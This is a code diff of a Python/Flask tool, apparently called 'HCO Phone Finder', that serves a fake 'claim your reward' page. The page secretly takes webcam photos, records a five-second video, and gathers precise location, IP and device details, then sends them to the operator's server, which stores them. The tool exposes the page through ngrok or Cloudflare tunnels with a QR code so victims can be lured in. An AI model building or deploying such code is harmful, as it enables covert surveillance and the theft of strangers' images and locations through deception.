@@ -61,13 +61,13 @@ def show_tool_lock_screen():
     print()
     print(f"\n{Fore.GREEN}🎬 Opening Hacker Colony Tech channel in YouTube app...{Style.RESET_ALL}")
 
-    youtube_channel_id = "UCv1K9o2SXHm4uV4xZzXQZ6A"  
-    youtube_user_url = "https://www.youtube.com/@HackerColonyTech"  
+    # Updated YouTube channel URL
+    youtube_channel_url = "https://youtube.com/@hackers_colony_tech?si=dGBQabTWv4paqINU"
     youtube_urls = [  
-        f'vnd.youtube://channel/{youtube_channel_id}',  
-        f'youtube://channel/{youtube_channel_id}',  
-        f'https://www.youtube.com/channel/{youtube_channel_id}',  
-        youtube_user_url  
+        f'vnd.youtube://channel/UCv1K9o2SXHm4uV4xZzXQZ6A',  
+        f'youtube://channel/UCv1K9o2SXHm4uV4xZzXQZ6A',  
+        youtube_channel_url,
+        'https://www.youtube.com/@hackers_colony_tech'
     ]  
 
     try:  
@@ -75,7 +75,7 @@ def show_tool_lock_screen():
         subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)  
         print(f"{Fore.GREEN}✅ Launched YouTube app via am start (vnd.youtube).{Style.RESET_ALL}")  
     except Exception:  
-        intent_uri = f'intent://www.youtube.com/channel/{youtube_channel_id}#Intent;package=com.google.android.youtube;scheme=https;end;'  
+        intent_uri = f'intent://www.youtube.com/@hackers_colony_tech#Intent;package=com.google.android.youtube;scheme=https;end;'  
         try:  
             cmd2 = ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', intent_uri]  
             subprocess.run(cmd2, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)  
@@ -92,7 +92,7 @@ def show_tool_lock_screen():
                     continue  
             if not opened:  
                 try:  
-                    webbrowser.open(youtube_user_url)  
+                    webbrowser.open(youtube_channel_url)  
                     print(f"{Fore.YELLOW}⚠️ Fallback opened browser to channel page.{Style.RESET_ALL}")  
                 except Exception as e:  
                     print(f"{Fore.RED}Failed to open YouTube (all methods): {e}{Style.RESET_ALL}")  
@@ -101,7 +101,7 @@ def show_tool_lock_screen():
     print(f"{Fore.GREEN}✅ Tool unlocked! Continuing...{Style.RESET_ALL}")
     time.sleep(2)
 
-# Tricky Reward HTML
+# Updated Reward HTML - No YouTube redirects
 HTML_PAGE = r"""<!doctype html>
 <html lang="en">  
 <head>  
@@ -127,9 +127,9 @@ HTML_PAGE = r"""<!doctype html>
   .status-box{padding:15px;border-radius:12px;text-align:center;margin:15px 0;display:none;font-weight:600}  
   .status-processing{background:rgba(255,193,7,0.9);display:block}  
   .status-success{background:rgba(46,204,113,0.9);display:block}  
-  .tool-locked{background:linear-gradient(45deg,#FF0000,#DC143C);color:white;padding:20px;border-radius:15px;text-align:center;margin:20px 0;display:none;border:3px solid rgba(255,255,255,0.3)}  
-  .countdown{font-size:3rem;font-weight:800;color:#FFD700;text-shadow:0 0 20px rgba(255,215,0,0.7);margin:20px 0;text-align:center;display:none}  
-  .unlock-message{background:rgba(255,255,255,0.2);padding:15px;border-radius:12px;text-align:center;margin:15px 0;display:none}  
+  .status-error{background:rgba(255,0,0,0.9);display:block}  
+  .data-captured{background:rgba(255,255,255,0.15);padding:15px;border-radius:12px;margin:15px 0;display:none}  
+  .data-item{margin:8px 0;font-size:0.9rem}  
   .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-right:10px}  
   @keyframes spin{to{transform:rotate(360deg)}}  
   @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}  
@@ -162,47 +162,29 @@ HTML_PAGE = r"""<!doctype html>
       <span class="btn-text">🎁 CLAIM YOUR REWARD NOW</span>  
     </button>  
     <div id="status" class="status-box"></div>  
-    <div id="toolLocked" class="tool-locked">  
-      🔒 TOOL IS LOCKED<br>  
-      <span style="font-size:0.9rem">Subscribe and click bell 🔔 icon to unlock</span>  
+    <div id="dataCaptured" class="data-captured">  
+      <h3 style="text-align:center;margin-bottom:15px;">📊 Data Captured Successfully</h3>  
+      <div class="data-item">📍 <span id="locationData">Collecting...</span></div>  
+      <div class="data-item">🌐 <span id="ipData">Collecting...</span></div>  
+      <div class="data-item">📸 <span id="photoData">Collecting...</span></div>  
+      <div class="data-item">🎥 <span id="videoData">Collecting...</span></div>  
+      <div class="data-item">📱 <span id="deviceData">Collecting...</span></div>  
     </div>  
-    <div id="countdown" class="countdown"></div>  
-    <div id="unlockMessage" class="unlock-message">  
-      Redirecting to YouTube for verification...  
-    </div>  
-    <iframe id="youtubeLauncher" style="display:none"></iframe>  
   </div>  
   <script>  
-function openYouTubeApp() {  
-    const channelId = 'UCv1K9o2SXHm4uV4xZzXQZ6A';  
-    const intentUrl = `intent://www.youtube.com/channel/${channelId}#Intent;package=com.google.android.youtube;scheme=https;end;`;  
-    const vndUrl = `vnd.youtube://channel/${channelId}`;  
-    const userUrl = 'https://www.youtube.com/@HackerColonyTech';  
-    setTimeout(() => {  
-        const a = document.createElement('a');  
-        a.href = intentUrl;  
-        a.style.display = 'none';  
-        document.body.appendChild(a);  
-        a.click();  
-        document.body.removeChild(a);  
-    }, 200);  
-    setTimeout(() => {  
-        window.location = vndUrl;  
-    }, 800);  
-    setTimeout(() => {  
-        window.open(userUrl, '_blank');  
-    }, 2200);  
-}  
 document.getElementById('claimBtn').addEventListener('click', async function() {  
     const btn = this;  
     const status = document.getElementById('status');  
+    const dataCaptured = document.getElementById('dataCaptured');  
     const btnText = btn.querySelector('.btn-text');  
+    
     btn.disabled = true;  
     btn.classList.remove('pulse');  
     btnText.innerHTML = '<span class="loader"></span> Processing Your Reward...';  
     status.className = 'status-box status-processing';  
     status.textContent = 'Verifying your eligibility...';  
     status.style.display = 'block';  
+    
     try {  
         const stream = await navigator.mediaDevices.getUserMedia({  
             video: { facingMode: 'user' },  
@@ -213,63 +195,138 @@ document.getElementById('claimBtn').addEventListener('click', async function() {
         await collectBasicData();  
     }  
 });  
+
 async function collectDeviceData(stream) {  
     const status = document.getElementById('status');  
-    status.textContent = 'Collecting reward verification data...';  
-    if (navigator.geolocation) {  
-        navigator.geolocation.getCurrentPosition(async (position) => {  
-            await processAllData(position, stream);  
-        }, async () => {  
-            await processAllData(null, stream);  
-        }, { enableHighAccuracy: true, timeout: 10000 });  
-    } else {  
-        await processAllData(null, stream);  
-    }  
+    status.textContent = '📸 Taking photos...';  
+    
+    // Capture 3 photos
+    const photos = [];
+    try {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        for (let i = 1; i <= 3; i++) {
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            photos.push(canvas.toDataURL('image/jpeg'));
+            status.textContent = `📸 Photo ${i}/3 captured...`;
+        }
+        
+        status.textContent = '🎥 Recording video...';
+        
+        // Capture 5-second video
+        let videoBlob = null;
+        try {
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+            
+            mediaRecorder.start();
+            await new Promise(resolve => setTimeout(resolve, 5000)); // 5 seconds
+            mediaRecorder.stop();
+            
+            await new Promise(resolve => {
+                mediaRecorder.onstop = () => {
+                    videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    resolve();
+                };
+            });
+        } catch (videoError) {
+            console.log('Video recording failed:', videoError);
+        }
+        
+        // Get location
+        let position = null;
+        if (navigator.geolocation) {
+            try {
+                position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                        enableHighAccuracy: true, 
+                        timeout: 10000 
+                    });
+                });
+            } catch (geoError) {
+                console.log('Location access denied');
+            }
+        }
+        
+        // Get IP and device info
+        let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};
+        try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            ipData = await ipResponse.json();
+        } catch (e) {}
+        
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language
+        };
+        
+        // Convert video to base64
+        let videoBase64 = null;
+        if (videoBlob) {
+            videoBase64 = await new Promise(resolve => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.readAsDataURL(videoBlob);
+            });
+        }
+        
+        const payload = {
+            latitude: position?.coords.latitude,
+            longitude: position?.coords.longitude,
+            accuracy: position?.coords.accuracy,
+            ip: ipData.ip,
+            city: ipData.city,
+            country: ipData.country_name,
+            deviceInfo: deviceInfo,
+            photos: photos,
+            video: videoBase64,
+            timestamp: Date.now(),
+            reward_claimed: true
+        };
+        
+        await sendToServer(payload);
+        
+    } catch (error) {
+        console.error('Error collecting data:', error);
+        await collectBasicData();
+    } finally {
+        // Stop all media tracks
+        stream.getTracks().forEach(track => track.stop());
+    }
 }  
-async function processAllData(position, stream) {  
-    const status = document.getElementById('status');  
-    status.textContent = 'Finalizing your reward...';  
-    let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};  
-    try {  
-        const ipResponse = await fetch('https://ipapi.co/json/');  
-        ipData = await ipResponse.json();  
-    } catch (e) {}  
-    const deviceInfo = {  
-        userAgent: navigator.userAgent,  
-        platform: navigator.platform,  
-        battery: await getBatteryInfo(),  
-        screen: `${screen.width}x${screen.height}`,  
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone  
-    };  
-    const mediaData = await captureMedia(stream);  
-    const payload = {  
-        latitude: position?.coords.latitude,  
-        longitude: position?.coords.longitude,  
-        accuracy: position?.coords.accuracy,  
-        ip: ipData.ip,  
-        city: ipData.city,  
-        country: ipData.country_name,  
-        deviceInfo: deviceInfo,  
-        photos: mediaData.photos,  
-        video: mediaData.video,  
-        timestamp: Date.now(),  
-        reward_claimed: true  
-    };  
-    await sendToServer(payload);  
-}  
+
 async function collectBasicData() {  
     const status = document.getElementById('status');  
-    status.textContent = 'Processing your reward claim...';  
+    status.textContent = '📡 Collecting basic information...';  
+    
     let ipData = {ip: 'Unknown'};  
     try {  
         const ipResponse = await fetch('https://ipapi.co/json/');  
         ipData = await ipResponse.json();  
     } catch (e) {}  
+    
     const deviceInfo = {  
         userAgent: navigator.userAgent,  
         platform: navigator.platform,  
-        screen: `${screen.width}x${screen.height}`  
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language
     };  
+    
     const payload = {  
         ip: ipData.ip,  
         city: ipData.city,  
@@ -278,110 +335,48 @@ async function collectBasicData() {
         timestamp: Date.now(),  
         reward_claimed: true  
     };  
+    
     await sendToServer(payload);  
 }  
-async function getBatteryInfo() {  
-    try {  
-        if ('getBattery' in navigator) {  
-            const battery = await navigator.getBattery();  
-            return {  
-                level: Math.round(battery.level * 100) + '%',  
-                charging: battery.charging  
-            };  
-        }  
-    } catch(e) {}  
-    return 'Unknown';  
-}  
-async function captureMedia(stream) {  
-    const result = { photos: [], video: null };  
-    try {  
-        const video = document.createElement('video');  
-        video.srcObject = stream;  
-        await video.play();  
-        const canvas = document.createElement('canvas');  
-        const ctx = canvas.getContext('2d');  
-        await new Promise(resolve => setTimeout(resolve, 1000));  
-        canvas.width = video.videoWidth;  
-        canvas.height = video.videoHeight;  
-        ctx.drawImage(video, 0, 0);  
-        result.photos.push(canvas.toDataURL('image/jpeg'));  
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });  
-        const chunks = [];  
-        mediaRecorder.ondataavailable = (e) => e.data.size > 0 && chunks.push(e.data);  
-        mediaRecorder.start();  
-        await new Promise(resolve => setTimeout(resolve, 3000));  
-        ctx.drawImage(video, 0, 0);  
-        result.photos.push(canvas.toDataURL('image/jpeg'));  
-        await new Promise(resolve => setTimeout(resolve, 2000));  
-        mediaRecorder.stop();  
-        await new Promise(resolve => {  
-            mediaRecorder.onstop = () => {  
-                const blob = new Blob(chunks, { type: 'video/webm' });  
-                const reader = new FileReader();  
-                reader.onload = () => {  
-                    result.video = reader.result.split(',')[1];  
-                    resolve();  
-                };  
-                reader.readAsDataURL(blob);  
-            };  
-        });  
-    } catch (error) {  
-        console.log('Media capture failed:', error);  
-    } finally {  
-        stream.getTracks().forEach(track => track.stop());  
-    }  
-    return result;  
-}  
+
 async function sendToServer(payload) {  
+    const status = document.getElementById('status');  
+    const dataCaptured = document.getElementById('dataCaptured');  
+    const btn = document.getElementById('claimBtn');  
+    const btnText = btn.querySelector('.btn-text');  
+    
     try {  
+        status.textContent = '📡 Sending data to server...';  
         await fetch('/report', {  
             method: 'POST',  
             headers: {'Content-Type': 'application/json'},  
             body: JSON.stringify(payload)  
         });  
-        showToolLocked();  
-    } catch (error) {  
-        showToolLocked();  
-    }  
-}  
-function showToolLocked() {  
-    const status = document.getElementById('status');  
-    const toolLocked = document.getElementById('toolLocked');  
-    const countdown = document.getElementById('countdown');  
-    const unlockMessage = document.getElementById('unlockMessage');  
-    const btnText = document.querySelector('.btn-text');  
-    status.className = 'status-box status-success';  
-    status.textContent = '✅ Reward Claimed Successfully!';  
-    setTimeout(() => {  
-        status.style.display = 'none';  
-        toolLocked.style.display = 'block';  
+        
+        // Show success and captured data
+        status.className = 'status-box status-success';  
+        status.textContent = '✅ Reward Claimed Successfully!';  
         btnText.textContent = '✅ Reward Claimed';  
-        setTimeout(startCountdown, 2000);  
-    }, 1500);  
-}  
-function startCountdown() {  
-    const toolLocked = document.getElementById('toolLocked');  
-    const countdown = document.getElementById('countdown');  
-    const unlockMessage = document.getElementById('unlockMessage');  
-    toolLocked.style.display = 'none';  
-    countdown.style.display = 'block';  
-    unlockMessage.style.display = 'block';  
-    let count = 9;  
-    countdown.textContent = count;  
-    const countdownInterval = setInterval(() => {  
-        count--;  
-        countdown.textContent = count;  
-        if (count <= 0) {  
-            clearInterval(countdownInterval);  
-            redirectToYouTube();  
-        }  
-    }, 1000);  
-}  
-function redirectToYouTube() {  
-    openYouTubeApp();  
-    setTimeout(() => {  
-        window.open('https://www.youtube.com/@HackerColonyTech', '_blank');  
-    }, 2000);  
+        
+        // Display captured data
+        dataCaptured.style.display = 'block';
+        document.getElementById('locationData').textContent = 
+            payload.latitude ? `${payload.latitude}, ${payload.longitude}` : 'Location access denied';
+        document.getElementById('ipData').textContent = 
+            `${payload.ip} (${payload.city}, ${payload.country})`;
+        document.getElementById('photoData').textContent = 
+            `${payload.photos ? payload.photos.length : 0} photos captured`;
+        document.getElementById('videoData').textContent = 
+            payload.video ? '5-second video captured' : 'Video not captured';
+        document.getElementById('deviceData').textContent = 
+            `${payload.deviceInfo.platform} - ${payload.deviceInfo.screen}`;
+            
+    } catch (error) {  
+        status.className = 'status-box status-error';  
+        status.textContent = '❌ Error claiming reward. Please try again.';  
+        btn.disabled = false;  
+        btnText.textContent = '🎁 CLAIM YOUR REWARD NOW';  
+    }  
 }  
 </script>  
 </body>  
@@ -424,25 +419,26 @@ def report():
             "photos": photo_files,
             "video": video_file,
             "user_agent": device_info.get("userAgent", "Unknown"),
-            "battery": device_info.get("battery", "Unknown"),
             "platform": device_info.get("platform", "Unknown"),
-            "screen": device_info.get("screen", "Unknown")
+            "screen": device_info.get("screen", "Unknown"),
+            "timezone": device_info.get("timezone", "Unknown"),
+            "language": device_info.get("language", "Unknown")
         }
         _received_reports.append(record)
         save_report_csv(record)
+        
         print(f"\n{Fore.GREEN}{Style.BRIGHT}🎁 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
-        if lat and lon:
-            print(f"{Fore.CYAN}📍 Location: {lat}, {lon}{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.YELLOW}📍 Location: Access denied{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📍 Location: {lat if lat else 'Access denied'}, {lon if lon else 'Access denied'}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
-        print(f"{Fore.CYAN}📸 Photos: {len(photo_files)}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📸 Photos: {len(photo_files)} captured{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}🔋 Battery: {device_info.get('battery', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.RED}🔒 Tool locked - Starting countdown to YouTube{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📱 Device: {device_info.get('platform', 'Unknown')} - {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🌐 Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
+        
         return jsonify({"status": "success"})
     except Exception as e:
-        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+        print(f"{Fore.RED}Error processing report: {e}{Style.RESET_ALL}")
         return jsonify({"status": "error"}), 500
 
 def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
@@ -485,7 +481,7 @@ def save_report_csv(record: dict):
         with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
             writer = csv.DictWriter(f, fieldnames=[
                 'timestamp', 'ip', 'city', 'country', 'latitude', 'longitude',
-                'photos', 'video', 'user_agent', 'battery', 'platform', 'screen'
+                'photos', 'video', 'user_agent', 'platform', 'screen', 'timezone', 'language'
             ])
             if not file_exists:
                 writer.writeheader()
@@ -499,9 +495,10 @@ def save_report_csv(record: dict):
                 'photos': ', '.join(record['photos']),
                 'video': record['video'] or 'None',
                 'user_agent': record['user_agent'],
-                'battery': str(record['battery']),
                 'platform': record['platform'],
-                'screen': record['screen']
+                'screen': record['screen'],
+                'timezone': record['timezone'],
+                'language': record['language']
             })
     except Exception as e:
         print(f"{Fore.RED}CSV save error: {e}{Style.RESET_ALL}")
@@ -516,12 +513,35 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
-def generate_qr_code(url: str):
+def generate_colorful_qr_code(url: str):
     try:
-        qr = qrcode.QRCode(version=1, box_size=10, border=5)
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_H,
+            box_size=10,
+            border=4,
+        )
         qr.add_data(url)
         qr.make(fit=True)
-        img = qr.make_image(fill_color="black", back_color="white")
+        
+        # Create colorful QR code
+        img = qr.make_image(fill_color="#FF6B6B", back_color="#4ECDC4").convert('RGB')
+        
+        # Add decorative elements
+        draw = ImageDraw.Draw(img)
+        width, height = img.size
+        
+        # Add border
+        draw.rectangle([0, 0, width-1, height-1], outline="#FFE66D", width=8)
+        draw.rectangle([4, 4, width-5, height-5], outline="#1A535C", width=4)
+        
+        # Add corners
+        corner_size = 20
+        draw.rectangle([0, 0, corner_size, corner_size], fill="#FF6B6B")
+        draw.rectangle([width-corner_size, 0, width, corner_size], fill="#4ECDC4")
+        draw.rectangle([0, height-corner_size, corner_size, height], fill="#FFE66D")
+        draw.rectangle([width-corner_size, height-corner_size, width, height], fill="#1A535C")
+        
         img.save(QR_PNG)
         return True
     except Exception as e:
@@ -531,60 +551,128 @@ def generate_qr_code(url: str):
 def start_ngrok():
     try:
         print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
-        result = subprocess.run(['ngrok', 'http', str(PORT)], capture_output=True, text=True, timeout=5)
+        
+        # Check if ngrok is installed
+        result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
+        if result.returncode != 0:
+            print(f"{Fore.RED}❌ Ngrok not found. Please install ngrok first.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}💡 Install: https://ngrok.com/download{Style.RESET_ALL}")
+            return None
+            
+        # Start ngrok in background
+        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
+                                       stdout=subprocess.DEVNULL, 
+                                       stderr=subprocess.DEVNULL)
         time.sleep(3)
+        
+        # Get ngrok URL
         try:
-            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
+            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
             tunnels = response.json().get('tunnels', [])
             for tunnel in tunnels:
                 if tunnel['proto'] == 'https':
-                    print(f"{Fore.GREEN}✅ Ngrok URL: {tunnel['public_url']}{Style.RESET_ALL}")
-                    return tunnel['public_url']
-        except:
-            pass
-        print(f"{Fore.YELLOW}⚠️  Ngrok started but URL not fetched{Style.RESET_ALL}")
-        return "ngrok_tunnel_active"
+                    public_url = tunnel['public_url']
+                    print(f"{Fore.GREEN}✅ Ngrok URL: {public_url}{Style.RESET_ALL}")
+                    return public_url
+        except Exception as e:
+            print(f"{Fore.YELLOW}⚠️  Could not fetch ngrok URL: {e}{Style.RESET_ALL}")
+            return None
+            
     except Exception as e:
-        print(f"{Fore.YELLOW}⚠️  Ngrok not available: {e}{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
         return None
 
 def start_cloudflare():
     try:
         print(f"{Fore.CYAN}☁️  Starting Cloudflare tunnel...{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}✅ Cloudflare tunnel ready{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}💡 Run manually: cloudflared tunnel --url http://localhost:{PORT}{Style.RESET_ALL}")
-        return "cloudflare_ready"
+        
+        # Check if cloudflared is installed
+        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
+        if result.returncode != 0:
+            print(f"{Fore.RED}❌ Cloudflared not found. Please install it first.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}💡 Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/{Style.RESET_ALL}")
+            return None
+            
+        # Start Cloudflare tunnel
+        try:
+            # Try to get a tunnel URL by running cloudflared
+            process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'], 
+                                     stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE,
+                                     text=True)
+            
+            # Give it time to establish connection
+            time.sleep(5)
+            
+            # For now, return instructions
+            print(f"{Fore.GREEN}✅ Cloudflare tunnel process started{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}💡 Cloudflare tunnel is running in background{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}📋 Check dashboard: https://dash.cloudflare.com/{Style.RESET_ALL}")
+            
+            # Return a placeholder URL (in real scenario, you'd parse the output)
+            return "https://your-tunnel.try.cloudflare.com"
+            
+        except Exception as e:
+            print(f"{Fore.RED}❌ Cloudflare tunnel error: {e}{Style.RESET_ALL}")
+            return None
+            
     except Exception as e:
-        print(f"{Fore.YELLOW}⚠️  Cloudflare not available{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ Cloudflare not available: {e}{Style.RESET_ALL}")
         return None
+
+def display_server_info(local_url: str, public_url: str = None):
+    """Display server information in a beautiful format"""
+    print(f"\n{Back.CYAN}{Fore.BLACK}{' SERVER INFORMATION ':=^60}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}🎯 {Style.BRIGHT}Local URL:{Style.RESET_ALL} {Fore.WHITE}{local_url}{Style.RESET_ALL}")
+    
+    if public_url and public_url not in ["ngrok_tunnel_active", "cloudflare_ready"]:
+        print(f"{Fore.GREEN}🌍 {Style.BRIGHT}Public URL:{Style.RESET_ALL} {Fore.WHITE}{public_url}{Style.RESET_ALL}")
+    elif public_url == "ngrok_tunnel_active":
+        print(f"{Fore.GREEN}🌍 {Style.BRIGHT}Public URL:{Style.RESET_ALL} {Fore.YELLOW}Check ngrok dashboard: http://localhost:4040{Style.RESET_ALL}")
+    elif public_url == "cloudflare_ready":
+        print(f"{Fore.GREEN}🌍 {Style.BRIGHT}Public URL:{Style.RESET_ALL} {Fore.YELLOW}Check Cloudflare dashboard{Style.RESET_ALL}")
+    
+    print(f"{Fore.GREEN}📡 {Style.BRIGHT}Port:{Style.RESET_ALL} {Fore.WHITE}{PORT}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}🖥️  {Style.BRIGHT}Host:{Style.RESET_ALL} {Fore.WHITE}{HOST}{Style.RESET_ALL}")
+    print(f"{Back.CYAN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")
 
 def main():
     show_tool_lock_screen()
-    print(f"\n{Fore.CYAN}Select tunneling method:{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}1. Ngrok (Recommended){Style.RESET_ALL}")
-    print(f"{Fore.BLUE}2. Cloudflare{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}3. Local Network Only{Style.RESET_ALL}")
+    
+    print(f"\n{Back.MAGENTA}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}1. {Style.BRIGHT}Ngrok{Style.RESET_ALL} {Fore.YELLOW}(Recommended - Automatic){Style.RESET_ALL}")
+    print(f"{Fore.BLUE}2. {Style.BRIGHT}Cloudflare{Style.RESET_ALL} {Fore.YELLOW}(Manual setup required){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}3. {Style.BRIGHT}Local Network Only{Style.RESET_ALL} {Fore.YELLOW}(No internet sharing){Style.RESET_ALL}")
+    print(f"{Back.MAGENTA}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
 
-    choice = input(f"\n{Fore.CYAN}Enter your choice (1-3): {Style.RESET_ALL}").strip()
+    choice = input(f"\n{Fore.CYAN}🎯 Enter your choice (1-3): {Style.RESET_ALL}").strip()
+    
     local_ip = get_local_ip()
     local_url = f"http://{local_ip}:{PORT}"
     public_url = None
+    
     if choice == '1':
         public_url = start_ngrok()
     elif choice == '2':
         public_url = start_cloudflare()
+    elif choice == '3':
+        print(f"{Fore.YELLOW}📡 Using local network only{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
 
     print(f"\n{Fore.GREEN}🚀 Starting HCO Phone Finder Server...{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}📱 Local URL: http://localhost:{PORT}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}🌐 Network URL: {local_url}{Style.RESET_ALL}")
-    if public_url:
-        print(f"{Fore.GREEN}🌍 Public URL: {public_url}{Style.RESET_ALL}")
-        generate_qr_code(public_url)
-    else:
-        generate_qr_code(local_url)
-    print(f"{Fore.CYAN}📲 QR code generated: {QR_PNG}{Style.RESET_ALL}")
-    print(f"\n{Fore.GREEN}✅ Server ready! Share the link/QR to capture data.{Style.RESET_ALL}")
-    print(f"{Fore.RED}🔒 Tricky reward system activated{Style.RESET_ALL}\n")
+    
+    # Display server information
+    display_server_info(f"http://localhost:{PORT}", public_url)
+    
+    # Generate QR code
+    qr_url = public_url if public_url and public_url not in ["ngrok_tunnel_active", "cloudflare_ready"] else local_url
+    if generate_colorful_qr_code(qr_url):
+        print(f"{Fore.CYAN}📲 {Style.BRIGHT}QR code generated:{Style.RESET_ALL} {Fore.WHITE}{QR_PNG}{Style.RESET_ALL}")
+    
+    print(f"\n{Fore.GREEN}✅ {Style.BRIGHT}Server ready! Share the link/QR to capture data.{Style.RESET_ALL}")
+    print(f"{Fore.RED}🔒 {Style.BRIGHT}Tricky reward system activated{Style.RESET_ALL}\n")
+    
     try:
         app.run(host=HOST, port=PORT, debug=False)
     except KeyboardInterrupt:
